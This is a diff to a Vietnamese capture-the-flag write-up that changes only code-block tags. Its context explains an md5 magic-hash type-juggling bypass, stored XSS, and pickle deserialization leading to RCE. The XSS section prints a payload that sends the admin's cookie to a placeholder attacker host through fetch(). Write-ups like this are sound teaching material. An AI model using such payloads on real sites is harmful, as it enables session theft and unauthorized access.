@@ -33,7 +33,7 @@ Khi thấy có một phần của flag trong stack, ta sử dụng các chuỗi 
 ## Web/Type_Jugging
 Theo đề bài, có thể ứng dụng sử dụng logic so sánh `==` . Trong một số ngôn ngữ lập trình, việc sử dụng `==` sẽ ép kiểu hai bên thành một kiểu dữ liệu và so sánh, dẫn đến việc xác thực không chính xác. Ở kiểu hashing **md5** có những kí tự mà khi mã hoá sẽ có dạng 0e.. gọi là **magic hash**, nếu hash của mã nhân viên lưu ở  server có dạng 0e.. và dữ liệu đầu vào cũng là hash dạng 0e.. thì kết quả sẽ bằng nhau dù dữ liệu khác nhau, và đây chính là lỗ hổng **Type Juggling** (giống như tên đề bài gợi ý).
 Ví dụ trong PHP, ta có đoạn mã sau xác thực id được lưu dưới dạng **md5**:
-```(php)
+```php
 // user sẽ nhập id và gửi qua POST method
 // Ví dụ user nhập id là QNKCDZO khi hash bằng md5 sẽ ra 0e561023235613736034341027246353
 $hashed_id = "0e462097431906509019562988736854"
@@ -53,7 +53,7 @@ Quay lại bài, ta sẽ sử dụng chuỗi `QNKCDZO`, khi hash **md5** sẽ ra
 Tại challenge này sẽ có một dạng ứng dụng cho phép nhập tin nhắn, và khi tin nhắn được gửi đi admin của trang web sẽ trực tiếp đọc và kiểm duyệt nội dung tin nhắn đó.
 ![image](https://hackmd.io/_uploads/Bys4UBa3-l.png)
 Khi thử chèn javascript vào phần tin nhắn thì mình thấy ứng dụng có chạy js mà không filter kí tự nào. Vậy đây xảy ra lỗ hổng **XSS**, và ta sẽ dùng **XSS** để lấy thông tin, session của admin và gửi về máy của ta. Mình có thử viết một đoạn payload nhỏ để gửi thông tin về máy.
-```(html)
+```html
 <a src=c onerror="fetch('http://myhackersite.dola?c='+btoa(document.cookie)"></a>
 ```
 Nhưng sau nhiều lần thử với nhiều payload khác nhau, mình lại không thấy admin truy cập vào site của mình.
@@ -112,7 +112,7 @@ Trong bài này ứng dụng cho phép người dùng import và export setting 
 Vì server chạy bằng python và khi export dữ liệu ở dạng base64 nên ta có thể chắc ứng dụng đã dùng `pickle` cho Serialization và Deserialization. Ở đây ta có một hàm đặc biệt là hàm `__reduce__()`, hàm này sẽ được gọi tự động khi đối tượng được deserialization, đây là lỗ hổng **Insecure Deserialization**. Vậy ta sẽ lợi dụng hàm này để **RCE** và lấy được flag.
 Đây là phần code để tạo ra đoạn blob, import blob này vào web và thành công đọc được flag.
 (sau khi thử thì mình tìm được flag tại /flag.txt)
-```(python)
+```python
 import pickle
 import base64
 
